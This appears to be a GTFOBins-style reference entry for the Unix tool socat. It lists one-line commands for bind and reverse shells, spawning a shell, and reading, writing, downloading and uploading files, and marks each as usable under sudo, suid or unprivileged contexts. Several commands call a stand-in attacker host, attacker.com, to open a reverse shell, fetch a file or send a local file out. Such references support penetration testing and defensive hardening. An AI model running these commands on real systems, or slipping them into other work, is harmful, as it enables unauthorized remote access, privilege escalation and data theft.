---
type: gtfobin
name: socat
platform: Unix
functions: [bind-shell, download, file-read, file-write, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# socat

## bind-shell

```bash
socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
**Contexts:** sudo, suid, unprivileged

## download

```bash
socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
socat -u file:/path/to/input-file -
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
socat -u 'exec:echo DATA' open:/path/to/output-file,creat
```
_The `echo` command is actually used._
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
socat - exec:/bin/sh,pty,ctty,raw,echo=0
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
```
**Contexts:** sudo, suid, unprivileged
